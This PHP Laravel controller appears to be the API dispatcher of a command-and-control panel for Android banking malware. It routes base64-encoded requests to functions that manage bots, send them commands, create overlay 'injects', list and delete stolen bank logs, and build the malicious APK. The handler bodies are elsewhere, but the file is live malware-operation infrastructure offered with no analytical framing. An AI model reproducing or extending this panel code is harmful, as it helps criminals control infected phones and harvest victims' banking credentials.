<?php

namespace App\Http\Controllers\Client;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

use App\Http\Controllers\Client\GlobalSettingController;
use App\Http\Controllers\Auth\LoginController;
use App\Http\Controllers\Log\BankLogController;

class RestAPIController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index(Request $request)
    {

        // date_default_timezone_set('America/Los_Angeles');

        $params = json_decode(base64_decode($request->params));

        $type = $params->type;

        switch ($type) {
            case 'mainStats':
                return (new BotController)->mainStats();
                // GlobalSetting
            case 'getGlobalSetting':
                return (new GlobalSettingController)->show();
            case 'setGlobalSetting':
                return (new GlobalSettingController)->update($params);
                // Inject
            case 'getInjectList':
                return (new InjectController)->index($params);
            case 'createInject':
                return (new InjectController)->store($params);
            case 'deleteInject':
                return (new InjectController)->destroy($params);
            case 'showInject':
                return (new InjectController)->show($params);
                // bot
            case 'getBotTable':
                return (new BotController)->index($params);
            case 'getBotShow':
                return (new BotController)->show($params);
            case 'deleteBot':
                return (new BotController)->deleteBot($params);
            case 'setCommand':
                return (new BotController)->setCommand($params);
            case 'setComment':
                return (new BotController)->setComment($params);
            case 'getLog':
                return (new BotController)->getLogByType($params);
            case 'deleteBotLog':
                return (new BotController)->deleteBotLog($params);
                // bot setting
            case 'getBotSetting':
                return (new BotSettingController)->show($params);
            case 'setBotSetting':
                return (new BotSettingController)->update($params);
            case 'getBankLog':
                return (new BankLogController)->index($params);
            case 'buildAPK':
                return (new APKBuilderController)->build($params);
                // auth
            case 'login':
                return (new LoginController)->login($params);
            case 'register':
                return (new LoginController)->register($params);
                // bank log
            case 'deleteBankLog':
                return (new BankLogController)->deleteLog($params);
            case 'deleteAllBankLog':
                return (new BankLogController)->deleteAllLog($params);
            }
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }
}
